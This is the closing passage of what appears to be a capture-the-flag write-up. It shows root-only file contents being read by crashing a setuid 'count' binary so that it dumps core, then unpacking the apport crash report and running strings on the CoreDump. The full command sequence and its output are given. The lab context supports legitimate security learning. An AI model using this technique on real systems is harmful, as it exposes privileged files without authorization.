<p>Looking at the source code the write functionality looks intresting but the problem is that we cannot write in privilleged mode and not the content of file so there is no possible way we can write something to high-privileged file or see the content of higher privileged file.</p>
<p>The catch over here is that what if we crash the code in between the execution of the code.
Most of the time if we crash the process in between the report is most of the time saved in /var/crash in linux distro.
Normally this won&#39;t be possible but with this perm set prctl(PR_SET_DUMPABLE, 1); it could be possible.</p>
<p>As it is set to 1 we can produce core dump so let&#39;s test this thoery practically.
For this we need 2 shells so first make sure you have 2 shells.
1 -&gt; To run the count binary
2 -&gt; To create crash</p>
<p>Shell 1
dasith@secret:/$ cd /opt
dasith@secret:/opt$ ./count -p
/root/root.txt
y</p>
<p>Now let&#39;s go to shell 2 to crash the binary</p>
<p>Shell 2
dasith@secret:/opt$ ps -aux | grep count
root         812  0.0  0.1 235664  7428 ?        Ssl  10:14   0:00 /usr/lib/accountsservice/accounts-daemon
dasith     67786  0.0  0.0   2488   580 ?        S    13:25   0:00 ./count -p
dasith     67788  0.0  0.0   6432   736 ?        S    13:25   0:00 grep --color=auto count</p>
<p>Now kill the process with the PID corresponding to ./count -p
dasith@secret:/opt$ kill -BUS 67786</p>
<p>Now you can check the shell1 if the process is been crashed.</p>
<p>Shell 1
dasith@secret:/opt$ ./count -p
/root/root.txt
y
bash: [67393: 3 (255)] tcsetattr: Inappropriate ioctl for device</p>
<p>Indeed we have crashed the process so lets check the /var/crash for the report.
dasith@secret:/opt$ cd /var/crash
dasith@secret:/opt$ ls -al
total 88
drwxrwxrwt  2 root   root    4096 Oct 31 13:24 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28127 Oct 31 13:24 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash</p>
<p>dasith@secret:/opt$ mkdir /tmp/oopsie
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/oopsie
dasith@secret:/var/crash$ cd /tmp/oopsie
dasith@secret:/tmp/oopsie$ ls -al
total 444
drwxr-xr-x  2 dasith dasith   4096 Oct 31 13:31 .
drwxrwxrwt 16 root   root     4096 Oct 31 13:30 ..
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 Architecture
-rw-r--r--  1 dasith dasith 380928 Oct 31 13:31 CoreDump
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 CrashCounter
-rw-r--r--  1 dasith dasith     24 Oct 31 13:31 Date
-rw-r--r--  1 dasith dasith     12 Oct 31 13:31 DistroRelease
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutablePath
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutableTimestamp
-rw-r--r--  1 dasith dasith      2 Oct 31 13:31 _LogindSession
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 ProblemType
-rw-r--r--  1 dasith dasith      7 Oct 31 13:31 ProcCmdline
-rw-r--r--  1 dasith dasith      4 Oct 31 13:31 ProcCwd
-rw-r--r--  1 dasith dasith     97 Oct 31 13:31 ProcEnviron
-rw-r--r--  1 dasith dasith   2144 Oct 31 13:31 ProcMaps
-rw-r--r--  1 dasith dasith   1342 Oct 31 13:31 ProcStatus
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 Signal
-rw-r--r--  1 dasith dasith     29 Oct 31 13:31 Uname
-rw-r--r--  1 dasith dasith      3 Oct 31 13:31 UserGroups</p>
<p>We have the coredump file so let&#39;s check it out using strings or else it will give out gibberish output.
dasith@secret:/tmp/oopsie$ strings CoreDump
&lt;----REDACTED----&gt;
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
root/root.txt<br><br>
&lt;--REDACTED--&gt;aa9c3c6efe&lt;--REDACTED--&gt;
<p>Looks like we have the root flag.</p>
	</main>

	<footer class="footerWithContact">
		<div class="contactMe">
			<!-- Footer content here -->
			<div>Contact Me
				
			</div>
		</div>
		<div >
			<div>
			<a href="https://twitter.com/AnonHack3r" class="DM">
			<span>
				Direct Message on Twitter
			</span>
		</div>
	</div>
		<div></div>
		</div>
		<div></div>
	</footer>

	<script src="../../../js/main.js"></script>
</body>

</html>
		